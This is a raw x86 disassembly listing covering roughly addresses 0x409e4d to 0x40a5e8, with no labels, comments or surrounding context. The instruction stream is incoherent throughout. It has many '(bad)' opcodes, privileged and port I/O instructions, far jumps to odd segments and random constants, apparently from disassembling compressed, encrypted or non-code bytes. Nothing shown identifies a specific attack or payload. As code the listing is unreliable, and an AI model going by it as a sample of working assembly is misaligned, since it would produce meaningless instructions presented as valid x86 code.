  409e4d:	pop    esi
  409e4e:	in     eax,0xbc
  409e50:	mov    DWORD PTR [esi-0x9a1848],edi
  409e56:	jne    0x409e8d
  409e58:	jge    0x409ebe
  409e5a:	dec    edi
  409e5b:	pop    ebp
  409e5c:	sbb    edx,DWORD PTR [esi-0x5f32b1d3]
  409e62:	mov    eax,ds:0x6e865a02
  409e67:	sbb    esi,edi
  409e69:	sub    al,0x68
  409e6b:	mov    bl,0xd7
  409e6d:	lds    ebp,FWORD PTR [ebp+0x71]
  409e70:	push   edi
  409e71:	sub    bl,BYTE PTR [edi]
  409e73:	dec    edi
  409e74:	ja     0x409e9c
  409e76:	mov    ebx,0x895fae06
  409e7b:	test   al,0x60
  409e7d:	arpl   WORD PTR [ecx-0x18f23b46],cx
  409e83:	daa    
  409e84:	adc    DWORD PTR [ebx-0x54],ebp
  409e87:	mov    dh,0x1c
  409e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8a:	mov    esp,DWORD PTR [ecx]
  409e8c:	aam    0xd1
  409e8e:	(bad)  
  409e8f:	fnstcw WORD PTR [ebx-0x59]
  409e92:	scas   al,BYTE PTR es:[edi]
  409e93:	into   
  409e94:	xchg   ebx,eax
  409e95:	sub    ecx,DWORD PTR [edx+0x3a]
  409e98:	cwde   
  409e99:	adc    al,0x9
  409e9b:	inc    ecx
  409e9c:	(bad)  [eax]
  409e9e:	xlat   BYTE PTR ds:[ebx]
  409e9f:	arpl   WORD PTR [edi+esi*2+0x2f6da038],sp
  409ea6:	mov    ch,0x73
  409ea8:	fnstenv fs:[edi]
  409eab:	mov    ebx,0xba8183b7
  409eb0:	and    ebx,edx
  409eb2:	or     al,0xc7
  409eb4:	sub    eax,0x186624b5
  409eb9:	jg     0x409e4a
  409ebb:	mov    bl,dl
  409ebd:	jecxz  0x409ea3
  409ebf:	add    bh,BYTE PTR es:[esi+0x54d7723e]
  409ec6:	push   0x55b4f20
  409ecb:	mov    ebx,0x562e8c08
  409ed0:	or     al,0x19
  409ed2:	xchg   esi,eax
  409ed3:	dec    eax
  409ed4:	sbb    ebp,eax
  409ed6:	mov    BYTE PTR [ebx],ch
  409ed8:	inc    edi
  409ed9:	mov    ds:0x2e3b34a1,al
  409ede:	(bad)  
  409edf:	sti    
  409ee0:	cmp    ebp,DWORD PTR [edx-0x6fdfad6]
  409ee6:	out    0xfb,eax
  409ee8:	dec    esi
  409ee9:	fwait
  409eea:	sbb    al,dh
  409eec:	xlat   BYTE PTR ds:[ebx]
  409eed:	(bad)  
  409eee:	fs lahf 
  409ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef1:	mov    ch,0x73
  409ef3:	jne    0x409f41
  409ef5:	scas   al,BYTE PTR es:[edi]
  409ef6:	icebp  
  409ef7:	pop    es
  409ef8:	ss (bad) 
  409efa:	adc    esp,edx
  409efc:	push   ss
  409efd:	imul   edx,DWORD PTR [esi],0x1b4e5b04
  409f03:	fiadd  WORD PTR ds:0x1f9f836c
  409f09:	fwait
  409f0a:	jne    0x409efb
  409f0c:	add    al,0x5b
  409f0e:	(bad)  
  409f0f:	pop    eax
  409f10:	xchg   ecx,eax
  409f11:	jne    0x409f89
  409f13:	xor    eax,0x816523d2
  409f18:	xor    ebx,DWORD PTR [ecx-0x2c]
  409f1b:	cmp    al,0x90
  409f1d:	in     al,0xa
  409f1f:	add    eax,0xb039d569
  409f24:	add    al,al
  409f26:	xchg   esi,eax
  409f27:	jge    0x409f1d
  409f29:	fstp   QWORD PTR [esi-0x3de5dde3]
  409f2f:	push   es
  409f30:	sub    dh,BYTE PTR [eax]
  409f32:	lock sub al,0xfa
  409f35:	fs in  eax,dx
  409f37:	jns    0x409f7c
  409f39:	gs cwde 
  409f3b:	hlt    
  409f3c:	or     al,0x7e
  409f3e:	mov    ebx,0xfdd8beac
  409f43:	mov    bl,0xfb
  409f45:	sub    BYTE PTR [ebx-0x5b],ah
  409f48:	dec    esp
  409f49:	fimul  DWORD PTR [ecx+0x61]
  409f4c:	or     BYTE PTR cs:[eax],0x9d
  409f50:	out    dx,al
  409f51:	add    al,0x4f
  409f53:	in     al,0xd1
  409f55:	dec    ebx
  409f56:	scas   eax,DWORD PTR es:[edi]
  409f57:	and    DWORD PTR [esi-0x580ed92b],ecx
  409f5d:	pminub mm1,QWORD PTR [ebx+0x5b]
  409f61:	sub    DWORD PTR [ebx+0x1520686b],eax
  409f67:	mov    bl,0xaa
  409f69:	stc    
  409f6a:	js     0x409f69
  409f6c:	clc    
  409f6d:	jl     0x409fb4
  409f6f:	jo     0x409fa3
  409f71:	jge    0x409f1f
  409f73:	pop    eax
  409f74:	pop    esi
  409f75:	and    eax,0x295cffce
  409f7a:	fistp  WORD PTR [ecx]
  409f7c:	add    ch,ah
  409f7e:	cli    
  409f7f:	mov    ds:0x1c8b7168,eax
  409f84:	pusha  
  409f85:	call   0xe9703d49
  409f8a:	dec    ebp
  409f8b:	cmc    
  409f8c:	jp     0x409f5e
  409f8e:	lahf   
  409f8f:	es add edx,ecx
  409f92:	mov    eax,0xf3adbff
  409f97:	sub    dl,bh
  409f99:	pop    eax
  409f9a:	pusha  
  409f9b:	out    dx,eax
  409f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9d:	cmp    al,0x46
  409f9f:	arpl   sp,sp
  409fa1:	sub    DWORD PTR [edx-0x39ad5b37],esp
  409fa7:	cmp    ch,BYTE PTR [ebp-0x7f]
  409faa:	xchg   ebp,eax
  409fab:	mov    ch,0xd9
  409fad:	cmp    eax,0xa1126d8f
  409fb2:	xchg   eax,ebx
  409fb4:	fdivr  st(3),st
  409fb6:	es push cs
  409fb8:	xor    bl,cl
  409fba:	pushf  
  409fbb:	in     eax,0xea
  409fbd:	fstp   DWORD PTR ds:0x41824937
  409fc3:	push   esi
  409fc4:	push   ss
  409fc5:	push   0xffffffad
  409fc7:	or     ebp,DWORD PTR [ecx+0x381c8bf7]
  409fcd:	mov    dl,0x53
  409fcf:	inc    ebx
  409fd0:	pop    ss
  409fd1:	retf   
  409fd2:	cmp    edx,edi
  409fd4:	push   ss
  409fd5:	(bad)  
  409fd6:	jmp    0x409ffb
  409fd8:	repnz or DWORD PTR [edi+0x2],esi
  409fdc:	sbb    eax,esp
  409fde:	out    0xfd,eax
  409fe0:	(bad)  
  409fe1:	lock shl BYTE PTR [ebp+0x83b6034],1
  409fe8:	add    DWORD PTR [esp+edi*1-0x7f],edi
  409fec:	push   edx
  409fed:	popf   
  409fee:	add    dl,BYTE PTR [ebx+0x36]
  409ff1:	fiadd  DWORD PTR [ebp+0x13542fa6]
  409ff7:	cs bswap eax
  409ffa:	add    al,0xc6
  409ffc:	sbb    BYTE PTR [ebx-0x34e15d07],ch
  40a002:	mov    eax,DWORD PTR [ecx+0xfb9b10a]
  40a008:	stos   BYTE PTR es:[edi],al
  40a009:	sbb    dl,BYTE PTR [eax]
  40a00b:	out    0xa4,al
  40a00d:	cwde   
  40a00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a00f:	or     al,0x15
  40a011:	(bad)  
  40a012:	sar    DWORD PTR [edi],cl
  40a014:	xchg   ebx,eax
  40a015:	stos   BYTE PTR es:[edi],al
  40a016:	daa    
  40a017:	add    edx,ebx
  40a019:	pop    edi
  40a01a:	outs   dx,BYTE PTR ds:[esi]
  40a01b:	mov    ah,0x78
  40a01d:	lea    ecx,[edx]
  40a01f:	and    al,0x6a
  40a021:	je     0x40a096
  40a023:	retf   0x459d
  40a026:	out    dx,al
  40a027:	xor    ecx,ebp
  40a029:	jge    0x409fc9
  40a02b:	cmp    eax,0x178ea472
  40a030:	sub    edi,DWORD PTR [eax]
  40a032:	in     al,dx
  40a033:	cmp    DWORD PTR [esi-0x549f26ef],edi
  40a039:	js     0x40a022
  40a03b:	iret   
  40a03c:	retf   
  40a03d:	mov    edx,0x20aafb4e
  40a042:	push   eax
  40a043:	fwait
  40a044:	retf   0x7623
  40a047:	or     cl,bl
  40a049:	mov    esp,0xf9016753
  40a04e:	(bad)
  40a053:	adc    eax,DWORD PTR [ebx]
  40a055:	add    ebx,esp
  40a057:	aam    0xc4
  40a059:	pop    esi
  40a05a:	dec    eax
  40a05b:	ds cdq 
  40a05d:	mov    ds,WORD PTR [edx+ecx*2-0x468c84c6]
  40a064:	sahf   
  40a065:	mov    ah,0x50
  40a067:	adc    eax,0x5ee81616
  40a06c:	fsubr  DWORD PTR [ebx]
  40a06e:	js     0x40a02e
  40a070:	sti    
  40a071:	and    bh,BYTE PTR [edi]
  40a073:	dec    ebp
  40a074:	mov    ah,0xaf
  40a076:	push   cs
  40a077:	sar    BYTE PTR [esi-0x58],1
  40a07a:	inc    ebp
  40a07b:	add    edi,0xf209ba35
  40a081:	xor    al,0xc7
  40a083:	das    
  40a084:	sub    ecx,ecx
  40a086:	cwde   
  40a087:	xor    eax,0xca73175c
  40a08c:	sbb    ebp,DWORD PTR [eax]
  40a08e:	not    DWORD PTR [esi]
  40a090:	dec    esi
  40a091:	mov    WORD PTR [esi],gs
  40a093:	push   esi
  40a094:	push   0x48
  40a096:	sub    BYTE PTR [edx],0xbc
  40a099:	push   es
  40a09a:	dec    esi
  40a09b:	adc    eax,0x4c70d129
  40a0a0:	(bad)  
  40a0a1:	(bad)  
  40a0a2:	gs jae 0x40a118
  40a0a5:	mov    eax,0x42c79dd4
  40a0aa:	jbe    0x40a0cc
  40a0ac:	pop    es
  40a0ad:	cmp    esi,DWORD PTR [ebx+0xbfb720a]
  40a0b3:	sub    esi,DWORD PTR [edx+ebx*1-0x50]
  40a0b7:	inc    ebp
  40a0b8:	stc    
  40a0b9:	sbb    DWORD PTR [ebx+0xabfa338],edi
  40a0bf:	jnp    0x40a071
  40a0c1:	lds    edi,FWORD PTR [edx+0x2810b9da]
  40a0c7:	jb     0x40a11d
  40a0c9:	outs   dx,BYTE PTR ds:[esi]
  40a0ca:	ja     0x40a095
  40a0cc:	xchg   ebx,eax
  40a0cd:	cs into 
  40a0cf:	sub    ah,BYTE PTR ds:0x477e28ba
  40a0d5:	popa   
  40a0d6:	sub    ch,BYTE PTR [ecx-0x6e]
  40a0d9:	retf   
  40a0da:	in     al,0x3c
  40a0dc:	sub    al,0x7d
  40a0de:	mov    al,0x4c
  40a0e0:	inc    esp
  40a0e1:	fsub   DWORD PTR [edi-0x15]
  40a0e4:	mov    ds:0xaf217b9d,eax
  40a0e9:	mov    esp,ebp
  40a0eb:	inc    ebp
  40a0ec:	jle    0x40a136
  40a0ee:	ja     0x40a15f
  40a0f0:	push   0xe6bb1ebc
  40a0f5:	fdivr  DWORD PTR [eax]
  40a0f7:	outs   dx,BYTE PTR ds:[esi]
  40a0f8:	sub    cl,bh
  40a0fa:	cmp    eax,0x1083a6d4
  40a0ff:	adc    eax,0x805ee61
  40a104:	push   esi
  40a105:	add    eax,0x30812544
  40a10a:	loopne 0x40a0d9
  40a10c:	sub    al,0xec
  40a10e:	cli    
  40a10f:	mov    cl,0x74
  40a111:	and    bh,BYTE PTR [esi*8+0x233b0962]
  40a118:	fwait
  40a119:	push   esi
  40a11a:	stc    
  40a11b:	pop    DWORD PTR ds:0x8ca51f1c
  40a121:	fucomip st,st(7)
  40a123:	jnp    0x40a116
  40a125:	test   al,0xe0
  40a127:	out    0xd7,al
  40a129:	xor    bh,BYTE PTR [edi+0x3f2a81c1]
  40a12f:	scas   al,BYTE PTR es:[edi]
  40a130:	xchg   ebx,eax
  40a131:	retf   0x168
  40a134:	push   0x24
  40a136:	mov    dh,0xd
  40a138:	pop    esi
  40a139:	scas   al,BYTE PTR es:[edi]
  40a13a:	dec    BYTE PTR [edx+edi*8]
  40a13d:	jecxz  0x40a122
  40a13f:	ret    
  40a140:	cli    
  40a141:	mov    DWORD PTR [edi+0x4515950d],0x5549bd73
  40a14b:	imul   eax,DWORD PTR [edx],0x69
  40a14e:	fcom   DWORD PTR [eax+0x6df10cd3]
  40a154:	cld    
  40a155:	jne    0x40a1a0
  40a157:	xchg   edi,eax
  40a158:	aas    
  40a159:	xchg   esp,eax
  40a15a:	push   ebx
  40a15b:	jns    0x40a116
  40a15d:	mov    bl,0xea
  40a15f:	cmp    BYTE PTR [ebp+0x786e1138],dl
  40a165:	sar    BYTE PTR [eax-0x54],1
  40a168:	cmp    eax,0x60ea5588
  40a16d:	(bad)  
  40a16e:	sub    BYTE PTR [esi+0x7e],ah
  40a171:	shl    DWORD PTR [esi+edx*1-0x45182483],1
  40a178:	jnp    0x40a186
  40a17a:	mov    al,0xd7
  40a17c:	sub    dl,0x8
  40a17f:	mov    BYTE PTR [ebx-0x55],dl
  40a182:	fdiv   DWORD PTR [ebp+0x4f479459]
  40a188:	xchg   ebx,eax
  40a189:	and    bh,ch
  40a18b:	cdq    
  40a18c:	sbb    BYTE PTR [ebx],0x6d
  40a18f:	mov    ah,0xc2
  40a191:	xchg   ebx,eax
  40a192:	test   BYTE PTR [edi-0x20abcec7],bl
  40a198:	ret    
  40a199:	jno    0x40a1d6
  40a19b:	add    BYTE PTR [edi+ecx*4+0x769beade],0x2f
  40a1a3:	or     BYTE PTR [ebp+0xd],dh
  40a1a6:	sub    DWORD PTR [ebp+0x25],ebx
  40a1a9:	je     0x414933
  40a1af:	lea    eax,[ebp-0xc]
  40a1b2:	jmp    0x40a6bd
  40a1b7:	ds aas 
  40a1b9:	enter  0xcd3f,0xcf
  40a1bd:	int    0x3d
  40a1bf:	xor    BYTE PTR [ecx+0x4f],al
  40a1c2:	pop    esp
  40a1c3:	imul   esi,DWORD PTR [ecx-0x79ff88bb],0x7c6a7878
  40a1cd:	js     0x40a247
  40a1cf:	pop    edx
  40a1d0:	popf   
  40a1d1:	jecxz  0x40a251
  40a1d3:	in     al,dx
  40a1d4:	test   al,al
  40a1d6:	pop    edi
  40a1d7:	ss jecxz 0x40a1e4
  40a1da:	int    0xf7
  40a1dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1dd:	xor    esi,DWORD PTR [eax+eax*8+0xd6c5b7f]
  40a1e4:	mov    cl,0xaf
  40a1e6:	lods   eax,DWORD PTR ds:[esi]
  40a1e7:	scas   eax,DWORD PTR es:[edi]
  40a1e8:	adc    eax,0x4bd318c9
  40a1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1ee:	clc    
  40a1ef:	fld    QWORD PTR [esi]
  40a1f1:	add    edx,DWORD PTR [edx-0x54523a52]
  40a1f7:	xor    ah,BYTE PTR [esp+esi*2-0x5e]
  40a1fb:	mov    eax,ds:0x9c3db5c0
  40a200:	sub    BYTE PTR [ebp+ecx*1-0x55193728],0xaf
  40a208:	mov    ss,WORD PTR [edx-0x7ac03b18]
  40a20e:	sub    al,0x50
  40a210:	sbb    al,0xb
  40a212:	mov    ah,0x61
  40a214:	xor    BYTE PTR [ebp+0x66],bh
  40a217:	cmp    ebx,ebx
  40a219:	inc    eax
  40a21a:	ja     0x40a28b
  40a21c:	mov    dl,bh
  40a21e:	fimul  WORD PTR [ebp+0x7d]
  40a221:	out    dx,al
  40a222:	xchg   DWORD PTR [edx+0x6d61641c],edx
  40a228:	jne    0x40a2a1
  40a22a:	shl    DWORD PTR [ecx+eax*2],cl
  40a22d:	mov    al,0x60
  40a22f:	lds    eax,FWORD PTR [edi+0x5c]
  40a232:	in     al,0x97
  40a234:	(bad)  
  40a235:	in     al,0x74
  40a237:	pop    eax
  40a238:	pop    ss
  40a239:	loop   0x40a292
  40a23b:	dec    ebx
  40a23c:	mov    esp,0x9b030d5b
  40a241:	test   BYTE PTR [ecx+ecx*4-0x5f5017ea],ch
  40a248:	push   ds
  40a249:	xchg   ebp,eax
  40a24a:	int    0x2b
  40a24c:	sub    eax,0x31af1b0e
  40a251:	ret    0x575b
  40a254:	ror    BYTE PTR [eax],0xda
  40a257:	out    dx,al
  40a258:	inc    ebp
  40a259:	imul   ebp,DWORD PTR [ebx+0x6b0ff119],0xffffffac
  40a260:	pusha  
  40a261:	inc    esi
  40a262:	xchg   edx,eax
  40a263:	cmp    dl,BYTE PTR [ecx+edx*2+0xede0693]
  40a26a:	jns    0x40a281
  40a26c:	pushf  
  40a26d:	jbe    0x40a278
  40a26f:	fistp  WORD PTR [edx+0x2d]
  40a272:	mov    al,ds:0x31977b3a
  40a277:	jle    0x40a297
  40a279:	js     0x40a29c
  40a27b:	jno    0x40a2d5
  40a27d:	pop    eax
  40a27e:	scas   al,BYTE PTR es:[edi]
  40a27f:	adc    ah,BYTE PTR [esi]
  40a281:	arpl   WORD PTR [esi],bx
  40a283:	add    DWORD PTR [ecx],esi
  40a285:	xor    al,BYTE PTR [edx+0x4eede60]
  40a28b:	sbb    ah,BYTE PTR [ebp+0x1b7ac845]
  40a291:	mov    ds:0xf2c4a2ad,eax
  40a296:	add    ch,0x69
  40a299:	pop    edi
  40a29a:	jno    0x40a2f4
  40a29c:	or     DWORD PTR [ecx+0x53],edi
  40a29f:	in     eax,0xea
  40a2a1:	test   BYTE PTR [esp+edi*4+0x10],0xf8
  40a2a6:	and    eax,0x8b02d5be
  40a2ab:	add    BYTE PTR [ecx+0x6],cl
  40a2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2af:	into   
  40a2b0:	and    cl,BYTE PTR [ebp+0x61]
  40a2b3:	mov    ebp,DWORD PTR [ebp-0x50286316]
  40a2b9:	lock int 0xd7
  40a2bc:	push   0x89fdcc6c
  40a2c1:	dec    ebx
  40a2c2:	les    edi,FWORD PTR [eax+eiz*2-0x18]
  40a2c6:	mov    ds:0x1da32bb8,eax
  40a2cb:	(bad)  
  40a2cc:	jmp    0x23e:0xd1943f54
  40a2d3:	xor    esp,esp
  40a2d5:	cmp    ebp,ebx
  40a2d7:	in     al,0x30
  40a2d9:	push   esi
  40a2da:	jmp    0x40a277
  40a2dc:	sbb    al,0x73
  40a2de:	cli    
  40a2df:	and    BYTE PTR [edi+0x1],ah
  40a2e2:	(bad)  
  40a2e3:	xchg   ecx,eax
  40a2e4:	in     eax,dx
  40a2e5:	lea    esi,[ecx+0x3c]
  40a2e8:	push   ebp
  40a2e9:	nop
  40a2ea:	jg     0x40a335
  40a2ec:	add    eax,0xc057d13d
  40a2f1:	jge    0x40a356
  40a2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2f4:	or     DWORD PTR [edi-0x305fcee3],edi
  40a2fa:	lds    ecx,FWORD PTR [esi*1-0x64680b86]
  40a301:	ret    
  40a302:	int    0x41
  40a304:	lock or BYTE PTR [ebp+0x53620c59],dh
  40a30b:	(bad)  
  40a30d:	add    al,0xd1
  40a30f:	pop    esi
  40a310:	sar    bh,0x8
  40a313:	xor    ch,bh
  40a315:	int    0xb8
  40a317:	jecxz  0x40a35e
  40a319:	adc    ebx,DWORD PTR gs:[esi+0x48748e1a]
  40a320:	mov    bl,0xfa
  40a322:	sbb    al,0xd6
  40a324:	jle    0x40a32a
  40a326:	idiv   BYTE PTR ds:0xf3662f9d
  40a32c:	cmp    ebx,DWORD PTR ds:0xf20fc48f
  40a332:	xchg   esi,eax
  40a333:	mov    ch,0x82
  40a335:	icebp  
  40a336:	adc    DWORD PTR [edx+esi*1-0x51],0xa7980dc9
  40a33e:	jne    0x40a31d
  40a340:	stos   BYTE PTR es:[edi],al
  40a341:	pusha  
  40a342:	cmp    ebx,DWORD PTR [ebp-0x1e]
  40a345:	mov    ah,BYTE PTR [ebp-0x59]
  40a348:	sub    DWORD PTR [esi+0x2a],0xdf4ea49c
  40a34f:	pop    eax
  40a350:	pop    ebx
  40a351:	into   
  40a352:	ins    DWORD PTR es:[edi],dx
  40a353:	xchg   ecx,eax
  40a354:	add    DWORD PTR [esi+0x7879e145],ecx
  40a35a:	aaa    
  40a35b:	xor    al,0x20
  40a35d:	xchg   ebx,ebx
  40a35f:	xor    esi,DWORD PTR [edx]
  40a361:	mov    eax,ds:0xe2e4b5f5
  40a366:	mov    BYTE PTR [ecx+0x5d470ee6],al
  40a36c:	mov    DWORD PTR [ebp-0x1a859935],edi
  40a372:	jl     0x40a32e
  40a374:	(bad)  
  40a375:	xor    esi,DWORD PTR [esi+edi*1]
  40a378:	mov    ebx,ebx
  40a37a:	push   ecx
  40a37b:	test   al,0xde
  40a37d:	je     0x40a315
  40a37f:	mov    ebx,0xe5cafc0a
  40a384:	adc    BYTE PTR [ebp-0x36],bl
  40a387:	add    dl,BYTE PTR [edi-0x5f945e5f]
  40a38d:	or     DWORD PTR [edx+0xc],ecx
  40a390:	cmp    DWORD PTR [eax+0x15],esi
  40a393:	shl    ch,cl
  40a395:	sbb    al,0x3d
  40a397:	lods   eax,DWORD PTR ds:[esi]
  40a398:	sbb    esi,DWORD PTR [edi]
  40a39a:	out    0xcd,eax
  40a39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39d:	mov    ds:0x9b0c6d81,al
  40a3a2:	sub    ecx,DWORD PTR [esi-0x10da938b]
  40a3a8:	cwde   
  40a3a9:	jge    0x40a400
  40a3ab:	jo     0x40a3b4
  40a3ad:	add    BYTE PTR [ebx],ah
  40a3af:	add    al,0xa4
  40a3b1:	daa    
  40a3b2:	cli    
  40a3b3:	push   es
  40a3b4:	fdivr  QWORD PTR [eax]
  40a3b6:	jmp    0xc1f9aafd
  40a3bb:	ss ret 0xc910
  40a3bf:	pop    eax
  40a3c0:	(bad)  
  40a3c1:	aam    0x63
  40a3c3:	or     ah,ch
  40a3c5:	dec    ebx
  40a3c6:	mov    ebx,0x3ef36dae
  40a3cb:	lods   al,BYTE PTR ds:[esi]
  40a3cc:	test   al,0xeb
  40a3ce:	or     DWORD PTR [edi-0x14],0x13916205
  40a3d5:	sub    BYTE PTR ds:[edi+0x29],dh
  40a3d9:	jne    0x40a438
  40a3db:	mov    dh,0x6a
  40a3dd:	in     eax,0xb5
  40a3df:	test   eax,0x45363ed0
  40a3e4:	xchg   ebp,eax
  40a3e5:	jp     0x40a378
  40a3e7:	mov    eax,ds:0x7ce98ceb
  40a3ec:	stos   DWORD PTR es:[edi],eax
  40a3ed:	cmp    dh,BYTE PTR [eax]
  40a3ef:	mov    al,0xd7
  40a3f1:	xchg   ebp,eax
  40a3f2:	jp     0x40a377
  40a3f4:	(bad)  
  40a3f5:	js     0x40a3a5
  40a3f7:	mov    al,ds:0xdc719a7f
  40a3fc:	mov    ebx,0x373c0b30
  40a401:	ret    0xc6a0
  40a404:	mov    BYTE PTR [ebx+esi*1+0x0],al
  40a408:	mov    WORD PTR [esi+ebp*8+0x47],ds
  40a40c:	ins    DWORD PTR es:[edi],dx
  40a40d:	aas    
  40a40e:	clc    
  40a40f:	inc    esi
  40a410:	mov    bh,BYTE PTR [eax+ebp*4+0x44]
  40a414:	cmc    
  40a415:	push   edi
  40a416:	js     0x40a3c1
  40a418:	ror    BYTE PTR [edx-0x2a],0x28
  40a41c:	out    0x11,eax
  40a41e:	nop
  40a41f:	sub    DWORD PTR ss:[edx-0x11],ecx
  40a423:	addr16 std 
  40a425:	mov    dh,0xf7
  40a427:	mov    WORD PTR [edi],es
  40a429:	bound  ebp,QWORD PTR gs:[ecx-0x3c]
  40a42d:	(bad)  
  40a42e:	leave  
  40a42f:	daa    
  40a430:	add    al,0xec
  40a432:	arpl   WORD PTR ds:0xc6b35b5c,bp
  40a438:	cmp    al,0xa8
  40a43a:	retf   0xe78a
  40a43d:	inc    edx
  40a43e:	mov    esi,0xecea6826
  40a443:	sahf   
  40a444:	scas   al,BYTE PTR es:[edi]
  40a445:	cmp    ebp,esp
  40a447:	add    ebx,DWORD PTR [bp+di-0x337b]
  40a44c:	dec    esi
  40a44d:	inc    edi
  40a44e:	pushf  
  40a44f:	movups XMMWORD PTR [eax],xmm0
  40a452:	adc    ch,dh
  40a454:	jae    0x40a4cd
  40a456:	pop    ecx
  40a457:	test   eax,0xd1ae9f70
  40a45c:	xor    DWORD PTR [ecx+0xed39635],ebp
  40a462:	loope  0x40a4cc
  40a464:	jmp    0x4958af37
  40a469:	sar    DWORD PTR [ebp-0x43f0508e],1
  40a46f:	fild   WORD PTR [ecx+0x569c285a]
  40a475:	push   esp
  40a476:	inc    edi
  40a477:	dec    esp
  40a478:	imul   ecx,DWORD PTR ds:0x1514291d,0xffffffac
  40a47f:	xor    edi,esp
  40a481:	mov    ecx,0x22a07384
  40a486:	lahf   
  40a487:	mov    WORD PTR [ebp-0x6e4f24ce],?
  40a48d:	jae    0x40a44e
  40a48f:	div    DWORD PTR [edx+0x75]
  40a492:	jge    0x40a461
  40a494:	rcr    eax,1
  40a496:	jge    0x40a45b
  40a498:	pop    edi
  40a499:	and    eax,0x49ec4190
  40a49e:	push   ebx
  40a49f:	adc    al,0x9e
  40a4a1:	mov    ebx,0x43261a41
  40a4a6:	add    bh,BYTE PTR [edx-0x56e864e8]
  40a4ac:	(bad)  
  40a4ad:	(bad)  
  40a4af:	add    al,0x72
  40a4b1:	lods   eax,DWORD PTR ds:[esi]
  40a4b2:	arpl   WORD PTR [edi],bx
  40a4b4:	adc    BYTE PTR [eax+0x11e69fd6],0x8e
  40a4bb:	ret    0xa1b7
  40a4be:	adc    eax,0x2349d54b
  40a4c3:	adc    ebx,DWORD PTR [esp+esi*4]
  40a4c6:	arpl   ax,ax
  40a4c8:	xor    dl,cl
  40a4ca:	mov    ebx,0xf0f363d4
  40a4cf:	mov    dl,0x74
  40a4d1:	rcr    BYTE PTR ds:0x3ff4e9be,cl
  40a4d7:	xchg   bl,ch
  40a4d9:	in     al,0x34
  40a4db:	or     eax,0x68e01013
  40a4e0:	mov    cl,0xf5
  40a4e2:	or     eax,0xfe75c4f2
  40a4e7:	pop    ebx
  40a4e8:	fnsave [edi-0x8]
  40a4eb:	pop    edx
  40a4ec:	sahf   
  40a4ed:	xchg   ecx,eax
  40a4ee:	lahf   
  40a4ef:	push   esi
  40a4f0:	in     eax,0xeb
  40a4f2:	test   eax,0xe4074f1c
  40a4f7:	stc    
  40a4f8:	dec    edx
  40a4f9:	inc    eax
  40a4fa:	cmp    eax,0x31ded5f7
  40a4ff:	add    BYTE PTR [edi+edx*2+0x354ebc44],bh
  40a506:	add    eax,0xdec545b4
  40a50b:	fistp  QWORD PTR [esi]
  40a50d:	in     al,dx
  40a50e:	push   ss
  40a50f:	jo     0x40a4e3
  40a511:	stos   DWORD PTR es:[edi],eax
  40a512:	mov    ebx,0x9c3d4f62
  40a517:	sub    BYTE PTR [eax],cl
  40a519:	adc    dl,BYTE PTR [edi]
  40a51b:	xor    ah,BYTE PTR [edi+0x5b]
  40a51e:	xchg   esi,eax
  40a51f:	jl     0x40a512
  40a521:	pop    eax
  40a522:	int3   
  40a523:	repz or eax,0x978f1164
  40a529:	out    0x6,al
  40a52b:	inc    ebp
  40a52c:	sahf   
  40a52d:	(bad)  
  40a52e:	(bad)  
  40a52f:	and    ebx,esi
  40a531:	sar    DWORD PTR [eax-0x493807d6],0x82
  40a538:	mov    eax,ds:0x9312fa7
  40a53d:	cdq    
  40a53e:	xchg   edi,eax
  40a53f:	rcr    BYTE PTR [eax],0x15
  40a542:	out    dx,al
  40a543:	inc    ebx
  40a544:	push   ds
  40a545:	dec    edi
  40a546:	push   esi
  40a547:	cmp    al,0x9e
  40a549:	mov    ecx,0x8bc0b524
  40a54e:	fucomp st(4)
  40a550:	push   es
  40a551:	imul   esp,edi,0x18eb2a91
  40a557:	mov    ch,0x44
  40a559:	mov    bl,0x52
  40a55b:	push   0x6c9b0b2d
  40a560:	dec    ecx
  40a561:	imul   edx,DWORD PTR [esp+ebp*2],0x5f
  40a565:	js     0x40a5e5
  40a567:	and    ebp,DWORD PTR [edx-0x17]
  40a56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a56b:	push   edi
  40a56c:	(bad)
  40a570:	mov    DWORD PTR [edi],edi
  40a572:	scas   eax,DWORD PTR es:[edi]
  40a573:	retf   0xd64f
  40a576:	push   0xffffffc7
  40a578:	push   eax
  40a579:	mov    bl,0xa9
  40a57b:	push   cs
  40a57c:	fsub   QWORD PTR [ecx+0xab18d19]
  40a582:	jmp    0x2899:0x3019e9b6
  40a589:	call   0x3bbc7145
  40a58e:	(bad)  
  40a58f:	in     al,0x9d
  40a591:	(bad)  
  40a592:	(bad)  
  40a593:	mov    bh,0x2
  40a595:	jp     0x40a51c
  40a597:	xchg   edi,eax
  40a598:	mov    bh,0x93
  40a59a:	mov    edi,0x202de363
  40a59f:	dec    edi
  40a5a0:	std    
  40a5a1:	out    0x43,al
  40a5a3:	add    al,0xa5
  40a5a5:	jmp    0x40a584
  40a5a7:	adc    eax,0x2a7a87ac
  40a5ac:	xchg   esi,eax
  40a5ad:	fisttp DWORD PTR [esi+0x307bc8f4]
  40a5b3:	cmp    esp,DWORD PTR [ecx]
  40a5b5:	std    
  40a5b6:	lods   eax,DWORD PTR ds:[esi]
  40a5b7:	ja     0x40a5c7
  40a5b9:	mov    DWORD PTR [eax+0x72],esp
  40a5bc:	and    BYTE PTR [edx+0x5632a63d],cl
  40a5c2:	inc    esi
  40a5c3:	sbb    al,0x58
  40a5c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c6:	push   ecx
  40a5c7:	xor    eax,0xd87f2140
  40a5cc:	lds    edx,FWORD PTR [edx-0x16370864]
  40a5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d3:	xor    eax,0x5d3d2afc
  40a5d8:	retf   
  40a5d9:	mov    BYTE PTR [edi-0x20],dl
  40a5dc:	mov    fs,WORD PTR [edx-0x76]
  40a5df:	sub    bl,BYTE PTR [ebp+0x78]
  40a5e2:	ret    0x63c1
  40a5e5:	cdq    
  40a5e6:	wrmsr  
  40a5e8:	aaa    
